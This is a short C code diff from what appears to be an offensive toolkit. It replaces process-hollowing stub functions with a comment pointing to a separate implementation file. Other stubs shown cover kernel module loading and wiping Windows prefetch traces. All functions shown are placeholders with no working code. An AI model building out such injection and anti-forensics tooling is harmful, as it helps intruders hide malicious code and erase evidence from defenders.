@@ -12,9 +12,7 @@ int jocky_lkm_load(const char* path) { return -1; }
 int jocky_lkm_unload(const char* name) { return -1; }
 int jocky_module_base(const char* name) { return -1; }
 
-/* Process operations */
-int jocky_process_hollow(const char* path, const char* args) { return -1; }
-int jocky_process_hollow_linux(int pid, const char* elf_path) { return -1; }
+/* Process operations - implemented in process_hollow.c */
 
 /* Forensics operations */
 int jocky_wipe_prefetch(void) { return 0; }
